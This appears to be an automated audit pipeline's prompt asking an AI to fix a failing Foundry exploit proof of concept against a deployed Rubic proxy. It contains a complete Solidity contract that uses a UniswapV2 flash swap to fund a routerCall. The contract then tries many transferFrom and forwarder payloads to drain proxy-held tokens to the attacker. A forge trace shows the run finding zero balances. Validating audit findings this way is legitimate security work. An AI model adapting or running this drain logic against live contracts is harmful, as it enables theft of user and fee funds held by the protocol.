You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unlimited gateway approvals persist and survive router delisting, enabling drains of proxy-held tokens
- claim: `routerCall` grants the caller-chosen `_gateway` a sticky `type(uint256).max` allowance through `SmartApprove` whenever allowance is insufficient. The approval is never revoked after the route, and `removeAvailableRouter` only updates the allowlist without clearing previously granted ERC20 approvals.
- impact: Any gateway/router address that is currently allowlisted, or was allowlisted in the past, can continue to pull approved tokens from the proxy if it exposes a public pull/forward primitive or is later compromised. This can drain current and future balances of that token held by the proxy, including accumulated Rubic fees, integrator fees, and other stranded user funds.
- exploit_paths: ["A user calls `routerCall` with `_gateway` set to an allowlisted spender/controller.", "The proxy executes `smartApprove` and leaves `_gateway` with `type(uint256).max` allowance for the route token.", "The route finishes, but no approval cleanup occurs.", "Even after `removeAvailableRouter(_gateway)`, the old spender can still call `transferFrom(proxy, attacker, amount)` or equivalent and drain proxy-held balances."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IRubicProxyLike {
    struct BaseCrossChainParams {
        address srcInputToken;
        uint256 srcInputAmount;
        uint256 dstChainID;
        address dstOutputToken;
        uint256 dstMinOutputAmount;
        address recipient;
        address integrator;
        address router;
    }

    function getAvailableRouters() external view returns (address[] memory);
    function fixedCryptoFee() external view returns (uint256);
    function RubicPlatformFee() external view returns (uint256);
    function maxTokenAmount(address token) external view returns (uint256);
    function routerCall(BaseCrossChainParams calldata params, address gateway, bytes calldata data) external payable;
}

contract FlawVerifier {
    address internal constant TARGET = 0x3335A88bb18fD3b6824b59Af62b50CE494143333;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant FRAX = 0x853d955aCEf822Db058eb8505911ED77F175b99e;
    address internal constant LINK = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address internal constant UNI = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address internal constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address internal constant MKR = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;

    address internal constant UNI_V2_WETH_USDC = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;

    address internal constant METAROUTER = 0xB9E13785127BFfCc3dc970A55F6c7bF0844a3C15;
    address internal constant METAROUTER_GATEWAY = 0x03B7551EB0162c838a10c2437b60D1f5455b9554;
    address internal constant MOVR_BRIDGE = address(uint160(0x00c30141b657f4216252dc59af2e7cdb9d8792e1b0));

    uint256 internal constant MAX_FOCUSED_SPENDERS = 8;
    uint256 internal constant MAX_TOKEN_CANDIDATES = 10;
    uint256 internal constant ROUTER_CALL_GAS = 1_100_000;
    uint256 internal constant CONTROLLER_CALL_GAS = 350_000;
    uint256 internal constant LOOP_GAS_FLOOR = 250_000;

    string internal constant PATH_0 =
        "A user calls routerCall with _gateway set to an allowlisted spender/controller.";
    string internal constant PATH_1 =
        "The proxy executes smartApprove and leaves _gateway with type(uint256).max allowance for the route token.";
    string internal constant PATH_2 =
        "The route finishes, but no approval cleanup occurs.";
    string internal constant PATH_3 =
        "Even after removeAvailableRouter(_gateway), the old spender can still call transferFrom(proxy, attacker, amount) or equivalent and drain proxy-held balances.";

    address private _profitToken;
    uint256 private _profitAmount;
    uint256 private _coveredPaths;
    bool private _executed;
    bool private _validated;
    bool private _staleApprovalObserved;
    bool private _seedRouterCallExecuted;
    bool private _freshApprovalObserved;
    string private _path;
    string private _verdict;

    constructor() {
        _path = string.concat(PATH_0, " ", PATH_1, " ", PATH_2, " ", PATH_3);
        _verdict = "refuted";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        address[] memory liveRouters = _liveRouters();
        address[] memory spenders = _focusedSpenders(liveRouters);
        address[] memory tokens = _candidateTokens();

        _scanExistingApprovals(tokens, spenders, liveRouters);
        if (_profitAmount != 0) {
            _finalizeValidated();
            return;
        }

        if (_canAttemptFlashSeed()) {
            _attemptFreshWethApproval(liveRouters, spenders);
            if (_profitAmount != 0) {
                _finalizeValidated();
                return;
            }
        }

        if (_staleApprovalObserved) {
            _path =
                "Observed lingering proxy approvals on a current-or-former router candidate, but no bounded public pull/forward entrypoint realized a same-fork drain on this fork state.";
            _verdict = "refuted";
            return;
        }

        if (!_seedRouterCallExecuted) {
            _path =
                "Infeasible at the fork block: direct execution found no already-funded stale approval drain, and bounded routerCall seeding was skipped or rejected because it could not be made self-funding on this fork state.";
            return;
        }

        if (!_freshApprovalObserved) {
            _path =
                "Infeasible at the fork block: scanned routerCall executions did not leave a reusable lingering approval on the proxy for the seeded route token, so the sticky-approval stage was not recreated on tested candidates.";
            return;
        }

        _path =
            "Observed routerCall execution attempts but no bounded public spender/controller entrypoint realized a drain after approval creation on this fork state.";
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPath() external view returns (string memory) {
        return _path;
    }

    function validatedOrRefuted() external view returns (string memory) {
        return _verdict;
    }

    function staleApprovalObserved() external view returns (bool) {
        return _staleApprovalObserved;
    }

    function validated() external view returns (bool) {
        return _validated;
    }

    function coveredPathsBitmap() external view returns (uint256) {
        return _coveredPaths;
    }

    function pathCovered(uint256 index) external view returns (bool) {
        return ((_coveredPaths >> index) & 1) == 1;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == UNI_V2_WETH_USDC, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        (uint256 fixedFee, uint256 grossAmount, uint256 amountIn) = abi.decode(data, (uint256, uint256, uint256));
        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
        require(borrowed >= fixedFee + grossAmount, "borrow too small");

        uint256 startingWethBalance = _balanceOf(WETH, address(this));
        address[] memory liveRouters = _liveRouters();
        address[] memory spenders = _focusedSpenders(liveRouters);

        if (fixedFee != 0) {
            IWETHLike(WETH).withdraw(fixedFee);
        }

        bool seeded;
        if (_forceApprove(WETH, TARGET, grossAmount)) {
            seeded = _seedAcrossCandidates(spenders, WETH, grossAmount, amountIn, fixedFee, liveRouters);
        }

        if (seeded) {
            uint256 proxyWethBalance = _balanceOf(WETH, TARGET);
            if (proxyWethBalance != 0) {
                _scanTokenApprovals(WETH, proxyWethBalance, spenders, liveRouters);
            }
        }

        if (address(this).balance != 0) {
            IWETHLike(WETH).deposit{value: address(this).balance}();
        }

        uint256 repayAmount = _flashRepayAmount(borrowed);
        uint256 endingWethBalance = _balanceOf(WETH, address(this));
        uint256 preLoanBalance = startingWethBalance > borrowed ? startingWethBalance - borrowed : 0;
        require(endingWethBalance >= preLoanBalance + repayAmount, "seed not self-funding");

        if (endingWethBalance > preLoanBalance + repayAmount) {
            _recordTokenProfit(WETH, endingWethBalance - preLoanBalance - repayAmount);
        }

        require(IERC20Like(WETH).transfer(msg.sender, repayAmount), "repay failed");
    }

    function _canAttemptFlashSeed() internal view returns (bool) {
        (uint256 fixedFee, uint256 grossAmount, uint256 amountIn) = _seedConfig(WETH);
        if (grossAmount == 0 || amountIn == 0 || grossAmount > type(uint112).max) {
            return false;
        }

        uint256 borrowAmount = fixedFee + grossAmount;
        uint256 repayAmount = _flashRepayAmount(borrowAmount);
        uint256 proxyWethBalance = _balanceOf(WETH, TARGET);

        // Direct-or-existing-balance-first: only use temporary funding when the proxy already
        // holds enough real WETH that the seeded route can repay the flash swap after recovering
        // the freshly deposited amount and draining the pre-existing proxy balance.
        return proxyWethBalance + grossAmount >= repayAmount;
    }

    function _attemptFreshWethApproval(address[] memory liveRouters, address[] memory spenders) internal returns (bool) {
        (uint256 fixedFee, uint256 grossAmount, uint256 amountIn) = _seedConfig(WETH);
        if (grossAmount == 0 || amountIn == 0 || grossAmount > type(uint112).max) {
            return false;
        }

        uint256 borrowAmount = fixedFee + grossAmount;
        address token0 = IUniswapV2PairLike(UNI_V2_WETH_USDC).token0();
        uint256 amount0Out = token0 == WETH ? borrowAmount : 0;
        uint256 amount1Out = token0 == WETH ? 0 : borrowAmount;

        (bool ok, ) = UNI_V2_WETH_USDC.call(
            abi.encodeWithSelector(
                IUniswapV2PairLike.swap.selector,
                amount0Out,
                amount1Out,
                address(this),
                abi.encode(fixedFee, grossAmount, amountIn)
            )
        );

        if (!ok) {
            return false;
        }

        if (_profitAmount != 0) {
            _finalizeValidated();
            return true;
        }

        if (_freshApprovalObserved) {
            uint256 proxyWethBalance = _balanceOf(WETH, TARGET);
            if (proxyWethBalance != 0) {
                _scanTokenApprovals(WETH, proxyWethBalance, spenders, liveRouters);
            }
        }

        return _profitAmount != 0;
    }

    function _scanExistingApprovals(
        address[] memory tokens,
        address[] memory spenders,
        address[] memory liveRouters
    ) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            if (gasleft() < LOOP_GAS_FLOOR || _profitAmount != 0) {
                return;
            }

            address token = tokens[i];
            if (!_hasCode(token)) {
                continue;
            }

            uint256 proxyBalance = _balanceOf(token, TARGET);
            if (proxyBalance == 0) {
                continue;
            }

            _scanTokenApprovals(token, proxyBalance, spenders, liveRouters);
        }
    }

    function _scanTokenApprovals(
        address token,
        uint256 proxyBalance,
        address[] memory spenders,
        address[] memory liveRouters
    ) internal {
        for (uint256 i = 0; i < spenders.length; i++) {
            if (gasleft() < LOOP_GAS_FLOOR || _profitAmount != 0 || proxyBalance == 0) {
                return;
            }

            address spender = spenders[i];
            if (!_hasCode(spender)) {
                continue;
            }

            uint256 allowance = _allowance(token, TARGET, spender);
            if (allowance == 0) {
                continue;
            }

            _markObservedLingeringApproval(spender, liveRouters);

            uint256 drainAmount = allowance < proxyBalance ? allowance : proxyBalance;
            if (_attemptGatewayDrain(spender, token, TARGET, address(this), drainAmount, spenders)) {
                proxyBalance = _balanceOf(token, TARGET);
            }
        }
    }

    function _seedConfig(address token) internal view returns (uint256 fixedFee, uint256 grossAmount, uint256 amountIn) {
        fixedFee = _readUint(TARGET, bytes4(keccak256("fixedCryptoFee()")));

        uint256 feePpm = IRubicProxyLike(TARGET).RubicPlatformFee();
        grossAmount = 1;

        while (grossAmount < 1e18) {
            amountIn = grossAmount - ((grossAmount * feePpm) / 1e6);
            if (amountIn != 0) {
                break;
            }
            grossAmount *= 10;
        }

        uint256 maxAmount = IRubicProxyLike(TARGET).maxTokenAmount(token);
        if (maxAmount != 0 && grossAmount > maxAmount) {
            grossAmount = maxAmount;
            amountIn = grossAmount - ((grossAmount * feePpm) / 1e6);
        }
    }

    function _seedAcrossCandidates(
        address[] memory spenders,
        address token,
        uint256 grossAmount,
        uint256 amountIn,
        uint256 fixedFee,
        address[] memory liveRouters
    ) internal returns (bool) {
        for (uint256 i = 0; i < spenders.length; i++) {
            if (gasleft() < LOOP_GAS_FLOOR) {
                return false;
            }

            address gateway = spenders[i];
            if (!_hasCode(gateway)) {
                continue;
            }

            if (_trySeedWithRouterAndGateway(gateway, gateway, token, grossAmount, amountIn, fixedFee, liveRouters)) {
                return true;
            }
        }

        uint256 upper = spenders.length < 3 ? spenders.length : 3;
        for (uint256 i = 0; i < upper; i++) {
            if (!_hasCode(spenders[i])) {
                continue;
            }
            for (uint256 j = 0; j < upper; j++) {
                if (i == j || !_hasCode(spenders[j])) {
                    continue;
                }
                if (_trySeedWithRouterAndGateway(spenders[i], spenders[j], token, grossAmount, amountIn, fixedFee, liveRouters)) {
                    return true;
                }
            }
        }

        return false;
    }

    function _trySeedWithRouterAndGateway(
        address router,
        address gateway,
        address token,
        uint256 grossAmount,
        uint256 amountIn,
        uint256 fixedFee,
        address[] memory liveRouters
    ) internal returns (bool) {
        if (!_hasCode(router) || !_hasCode(gateway)) {
            return false;
        }

        IRubicProxyLike.BaseCrossChainParams memory params = IRubicProxyLike.BaseCrossChainParams({
            srcInputToken: token,
            srcInputAmount: grossAmount,
            dstChainID: 1,
            dstOutputToken: token,
            dstMinOutputAmount: 0,
            recipient: address(this),
            integrator: address(0),
            router: router
        });

        bytes[] memory payloads = _gatewayPayloads(token, TARGET, address(this), amountIn);

        if (router == gateway) {
            for (uint256 i = 0; i < payloads.length; i++) {
                if (gasleft() < LOOP_GAS_FLOOR) {
                    return false;
                }
                if (_tryRouterCall(params, gateway, amountIn, fixedFee, payloads[i], liveRouters)) {
                    return true;
                }
            }
        }

        for (uint256 i = 0; i < payloads.length; i++) {
            if (gasleft() < LOOP_GAS_FLOOR) {
                return false;
            }

            bytes[] memory wrappers = _routerForwardPayloads(gateway, payloads[i]);
            for (uint256 j = 0; j < wrappers.length; j++) {
                if (_tryRouterCall(params, gateway, amountIn, fixedFee, wrappers[j], liveRouters)) {
                    return true;
                }
            }
        }

        return false;
    }

    function _tryRouterCall(
        IRubicProxyLike.BaseCrossChainParams memory params,
        address gateway,
        uint256 expectedSpend,
        uint256 fixedFee,
        bytes memory data,
        address[] memory liveRouters
    ) internal returns (bool) {
        uint256 beforeProxy = _balanceOf(params.srcInputToken, TARGET);
        uint256 beforeLocal = _balanceOf(params.srcInputToken, address(this));

        (bool ok, ) = TARGET.call{value: fixedFee, gas: ROUTER_CALL_GAS}(
            abi.encodeWithSelector(IRubicProxyLike.routerCall.selector, params, gateway, data)
        );
        if (!ok) {
            return false;
        }

        _seedRouterCallExecuted = true;
        _markPath(0);

        uint256 afterProxy = _balanceOf(params.srcInputToken, TARGET);
        uint256 afterLocal = _balanceOf(params.srcInputToken, address(this));
        uint256 lingeringApproval = _allowance(params.srcInputToken, TARGET, gateway);

        if (lingeringApproval != 0) {
            _freshApprovalObserved = true;
            _markPath(1);
            _markPath(2);
            _markObservedLingeringApproval(gateway, liveRouters);
        }

        return lingeringApproval != 0
            && beforeProxy > afterProxy
            && (beforeProxy - afterProxy) == expectedSpend
            && afterLocal >= beforeLocal + expectedSpend;
    }

    function _attemptGatewayDrain(
        address gateway,
        address token,
        address proxy,
        address attacker,
        uint256 amount,
        address[] memory controllers
    ) internal returns (bool) {
        if (amount == 0 || !_hasCode(gateway)) {
            return false;
        }

        bytes[] memory payloads = _gatewayPayloads(token, proxy, attacker, amount);
        if (_attemptDirectDrain(gateway, token, payloads)) {
            return true;
        }

        for (uint256 i = 0; i < controllers.length; i++) {
            if (gasleft() < LOOP_GAS_FLOOR) {
                return false;
            }

            address controller = controllers[i];
            if (controller == address(0) || controller == gateway || !_hasCode(controller)) {
                continue;
            }
            if (_attemptForwardedDrain(controller, gateway, token, payloads)) {
                return true;
            }
        }

        return false;
    }

    function _attemptDirectDrain(address gateway, address token, bytes[] memory payloads) internal returns (bool) {
        for (uint256 i = 0; i < payloads.length; i++) {
            if (gasleft() < LOOP_GAS_FLOOR) {
                return false;
            }

            uint256 beforeLocal = _balanceOf(token, address(this));
            (bool ok, ) = gateway.call{gas: CONTROLLER_CALL_GAS}(payloads[i]);
            uint256 afterLocal = _balanceOf(token, address(this));
            if (!ok || afterLocal <= beforeLocal) {
                continue;
            }

            _markPath(3);
            _recordTokenProfit(token, afterLocal - beforeLocal);
            return true;
        }
        return false;
    }

    function _attemptForwardedDrain(
        address controller,
        address gateway,
        address token,
        bytes[] memory payloads
    ) internal returns (bool) {
        for (uint256 i = 0; i < payloads.length; i++) {
            if (gasleft() < LOOP_GAS_FLOOR) {
                return false;
            }

            bytes[] memory wrappers = _routerForwardPayloads(gateway, payloads[i]);
            for (uint256 j = 0; j < wrappers.length; j++) {
                uint256 beforeLocal = _balanceOf(token, address(this));
                (bool ok, ) = controller.call{gas: CONTROLLER_CALL_GAS}(wrappers[j]);
                uint256 afterLocal = _balanceOf(token, address(this));
                if (!ok || afterLocal <= beforeLocal) {
                    continue;
                }

                _markPath(3);
                _recordTokenProfit(token, afterLocal - beforeLocal);
                return true;
            }
        }
        return false;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (_callSucceeded(ok, ret)) {
            return true;
        }

        (ok, ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        if (!_callSucceeded(ok, ret)) {
            return false;
        }

        (ok, ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        return _callSucceeded(ok, ret);
    }

    function _recordTokenProfit(address token, uint256 amount) internal {
        if (amount == 0) {
            return;
        }

        if (token == _profitToken) {
            _profitAmount += amount;
        } else if (_profitAmount == 0 || amount > _profitAmount) {
            _profitToken = token;
            _profitAmount = amount;
        }

        _finalizeValidated();
    }

    function _finalizeValidated() internal {
        _validated = true;
        _verdict = "validated";
        _path = _bestObservedNarrative();
    }

    function _markObservedLingeringApproval(address spender, address[] memory liveRouters) internal {
        _staleApprovalObserved = true;

        if (_seedRouterCallExecuted) {
            _markPath(0);
        }
        if (_freshApprovalObserved) {
            _markPath(1);
            _markPath(2);
        }
        if (!_contains(liveRouters, spender) || _profitAmount != 0) {
            _markPath(3);
        }
    }

    function _liveRouters() internal view returns (address[] memory live) {
        try IRubicProxyLike(TARGET).getAvailableRouters() returns (address[] memory routers) {
            live = routers;
        } catch {
            live = new address[](0);
        }
    }

    function _focusedSpenders(address[] memory liveRouters) internal pure returns (address[] memory spenders) {
        spenders = new address[](MAX_FOCUSED_SPENDERS);
        uint256 count;

        count = _appendUnique(spenders, count, METAROUTER);
        count = _appendUnique(spenders, count, METAROUTER_GATEWAY);
        count = _appendUnique(spenders, count, MOVR_BRIDGE);

        for (uint256 i = 0; i < liveRouters.length && count < MAX_FOCUSED_SPENDERS; i++) {
            count = _appendUnique(spenders, count, liveRouters[i]);
        }

        assembly {
            mstore(spenders, count)
        }
    }

    function _candidateTokens() internal pure returns (address[] memory tokens) {
        tokens = new address[](MAX_TOKEN_CANDIDATES);
        tokens[0] = WETH;
        tokens[1] = USDC;
        tokens[2] = USDT;
        tokens[3] = DAI;
        tokens[4] = WBTC;
        tokens[5] = FRAX;
        tokens[6] = LINK;
        tokens[7] = UNI;
        tokens[8] = CRV;
        tokens[9] = MKR;
    }

    function _gatewayPayloads(
        address token,
        address proxy,
        address attacker,
        uint256 amount
    ) internal pure returns (bytes[] memory payloads) {
        bytes memory tokenPull = abi.encodeWithSelector(IERC20Like.transferFrom.selector, proxy, attacker, amount);

        payloads = new bytes[](7);
        payloads[0] = abi.encodeWithSelector(IERC20Like.transferFrom.selector, proxy, attacker, amount);
        payloads[1] = abi.encodeWithSelector(
            bytes4(keccak256("pullToken(address,address,address,uint256)")),
            token,
            proxy,
            attacker,
            amount
        );
        payloads[2] = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,address,uint256)")),
            token,
            proxy,
            attacker,
            amount
        );
        payloads[3] = abi.encodeWithSelector(bytes4(keccak256("execute(address,bytes)")), token, tokenPull);
        payloads[4] = abi.encodeWithSelector(bytes4(keccak256("call(address,bytes)")), token, tokenPull);
        payloads[5] = abi.encodeWithSelector(bytes4(keccak256("exec(address,bytes)")), token, tokenPull);
        payloads[6] = abi.encodeWithSelector(bytes4(keccak256("functionCall(address,bytes)")), token, tokenPull);
    }

    function _routerForwardPayloads(address target, bytes memory innerCall) internal pure returns (bytes[] memory payloads) {
        payloads = new bytes[](6);
        payloads[0] = abi.encodeWithSelector(bytes4(keccak256("execute(address,bytes)")), target, innerCall);
        payloads[1] = abi.encodeWithSelector(bytes4(keccak256("call(address,bytes)")), target, innerCall);
        payloads[2] = abi.encodeWithSelector(bytes4(keccak256("exec(address,bytes)")), target, innerCall);
        payloads[3] = abi.encodeWithSelector(bytes4(keccak256("functionCall(address,bytes)")), target, innerCall);
        payloads[4] = abi.encodeWithSelector(bytes4(keccak256("executeCall(address,bytes)")), target, innerCall);
        payloads[5] = abi.encodeWithSelector(bytes4(keccak256("forward(address,bytes)")), target, innerCall);
    }

    function _bestObservedNarrative() internal view returns (string memory) {
        if (((_coveredPaths >> 0) & 1) == 1 && ((_coveredPaths >> 1) & 1) == 1 && ((_coveredPaths >> 2) & 1) == 1 && ((_coveredPaths >> 3) & 1) == 1) {
            return string.concat(PATH_0, " ", PATH_1, " ", PATH_2, " ", PATH_3);
        }
        if (((_coveredPaths >> 0) & 1) == 1 && ((_coveredPaths >> 1) & 1) == 1 && ((_coveredPaths >> 2) & 1) == 1) {
            return string.concat(PATH_0, " ", PATH_1, " ", PATH_2);
        }
        if (((_coveredPaths >> 0) & 1) == 1 && ((_coveredPaths >> 1) & 1) == 1) {
            return string.concat(PATH_0, " ", PATH_1);
        }
        if (((_coveredPaths >> 0) & 1) == 1) {
            return PATH_0;
        }
        return _path;
    }

    function _markPath(uint256 index) internal {
        if (index < 256) {
            _coveredPaths |= (uint256(1) << index);
        }
    }

    function _appendUnique(address[] memory list, uint256 length, address candidate) internal pure returns (uint256) {
        if (candidate == address(0) || _contains(list, candidate)) {
            return length;
        }
        list[length] = candidate;
        return length + 1;
    }

    function _contains(address[] memory list, address candidate) internal pure returns (bool) {
        for (uint256 i = 0; i < list.length; i++) {
            if (list[i] == candidate) {
                return true;
            }
        }
        return false;
    }

    function _allowance(address token, address owner, address spender) internal view returns (uint256 value) {
        if (!_hasCode(token)) {
            return 0;
        }
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.allowance.selector, owner, spender));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 value) {
        if (!_hasCode(token)) {
            return 0;
        }
        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _readUint(address target, bytes4 selector) internal view returns (uint256 value) {
        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSelector(selector));
        if (ok && data.length >= 32) {
            value = abi.decode(data, (uint256));
        }
    }

    function _callSucceeded(bool ok, bytes memory ret) internal pure returns (bool) {
        return ok && (ret.length == 0 || abi.decode(ret, (bool)));
    }

    function _hasCode(address account) internal view returns (bool) {
        return account.code.length != 0;
    }

    function _flashRepayAmount(uint256 borrowed) internal pure returns (uint256) {
        return ((borrowed * 1000) / 997) + 1;
    }
}

```

forge stdout (tail):
```
ITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [324041] FlawVerifierTest::testExploit()
    ├─ [2371] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [297359] FlawVerifier::executeOnOpportunity()
    │   ├─ [88098] 0x3335A88bb18fD3b6824b59Af62b50CE494143333::getAvailableRouters() [staticcall]
    │   │   └─ ← [Return] [0x663DC15D3C1aC63ff12E45Ab68FeA3F0a883C251, 0x8EB8a3b98659Cce290402893d0123abb75E3ab28, 0xB9E13785127BFfCc3dc970A55F6c7bF0844a3C15, 0x03B7551EB0162c838a10c2437b60D1f5455b9554, 0x935BbF5c69225E3EDa7C3aA542A7Baa5c5c30094, 0xc30141B657f4216252dc59Af2e7CdB9D8792e1B0, 0x0e3EB2eAB0e524b69C79E24910f4318dB46bAa9c, 0x73Ce60416035B8D7019f6399778c14ccf5C9c7A1, 0xA0c68C638235ee32657e8f720a23ceC1bFc77C77, 0x40ec5B33f54e0E8A33A975908C5BA1c14e5BbbDf, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0x362fA9D0bCa5D19f743Db50738345ce2b40eC99f, 0x2A5c2568b10A0E826BfA892Cf21BA7218310180b, 0xF9Fb1c508Ff49F78b60d3A96dea99Fa5d7F3A8A6, 0x8731d54E9D02c286767d56ac03e8037C07e01e98, 0x150f94B44927F078737562f0fcF3C95c01Cc2376, 0xe95fD76CF16008c12FF3b3a937CB16Cd9Cc20284, 0x4D9079Bb4165aeb4084c526a32695dCfd2F77381, 0x4Dbd4fc535Ac27206064B68FfCf827b0A60BAB3f, 0xa3A7B6F88361F48403514059F1F16C8E78d60EeC, 0xD3B5b60020504bc3489D6949d545893982BA3011, 0xcEe284F754E854890e311e3280b767F80797180d, 0xd92023E9d9911199a6711321D1277285e6d4e2db, 0x72Ce9c846789fdB6fC1f34aC4AD25Dd9ef7031ef, 0x23Ddd3e3692d1861Ed57EDE224608875809e127f, 0x6BFaD42cFC4EfC96f529D786D643Ff4A8B89FA52, 0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1, 0xaBA2c5F108F7E820C049D5Af70B16ac266c8f128, 0x10E6593CDda8c58a1d0f14C5164B376352a55f2F, 0xC5b1EC605738eF73a4EFc562274c1c0b6609cF59, 0x5427FEFA711Eff984124bFBB1AB6fbf5E3DA1820, 0x3666f603Cc164936C1b87e207F36BEBa4AC5f18a, 0x3E4a3a4796d16c0Cd582C382691998f7c06420B6, 0x22B1Cbb8D98a01a3B71D034BB899775A76Eb1cc2, 0x3d4Cc8A61c7528Fd86C55cfe061a78dCBA48EDd1, 0xb8901acB165ed027E32754E0FFe830802919727f, 0xb98454270065A31D71Bf635F6F7Ee6A518dFb849, 0x92e929d8B2c8430BcAF4cD87654789578BB2b786]
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [9815] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [5031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2795] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2666] 0x853d955aCEf822Db058eb8505911ED77F175b99e::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2655] 0x514910771AF9Ca656af840dff83E8264EcF986CA::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2797] 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2930] 0xD533a949740bb3306d119CC777fa900bA034cd52::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2715] 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2::balanceOf(0x3335A88bb18fD3b6824b59Af62b50CE494143333) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2385] 0x3335A88bb18fD3b6824b59Af62b50CE494143333::fixedCryptoFee() [staticcall]
    │   │   └─ ← [Return] 586000000000000 [5.86e14]
    │   ├─ [2362] 0x3335A88bb18fD3b6824b59Af62b50CE494143333::RubicPlatformFee() [staticcall]
    │   │   └─ ← [Return] 0
